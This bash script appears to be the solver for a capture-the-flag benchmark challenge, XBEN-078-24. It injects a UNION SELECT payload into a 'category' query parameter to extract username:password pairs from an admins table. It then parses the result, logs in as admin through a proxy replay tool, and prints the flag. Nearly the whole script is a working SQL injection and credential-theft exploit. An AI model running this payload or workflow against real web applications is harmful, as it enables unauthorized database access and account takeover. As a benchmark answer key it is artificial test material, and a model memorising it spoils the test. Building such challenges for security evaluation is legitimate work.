#!/usr/bin/env bash
# XBEN-078-24 — UNION-based SQL injection to exfiltrate admin credentials.
# Proxy-mode twin. The category filter is injectable; a UNION pulls
# username:password from the admins table, which is then used to log in and read
# the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben078p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/admin.php"; BASE="$(req_of GET admin.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
# Pull user:pass out of the UNION result (printed in an <h2>).
union="$("$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'path=/index.php' \
  --set "query.category=x' UNION SELECT 1,concat(username,0x3a,password),3,4,5,6,7 FROM admins-- -" 2>/dev/null)"
CREDS="$(grep -oE '<h2[^>]*>[^<]*:[^<]*</h2>' <<<"$union" | sed -E 's/<[^>]+>//g' | head -1)"
[ -n "$CREDS" ] || { echo "the union returned no credential" >&2; exit 1; }
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=POST' --set 'path=/admin.php' \
  --set "form.username=${CREDS%%:*}" --set "form.password=${CREDS#*:}" >/dev/null
print_flag
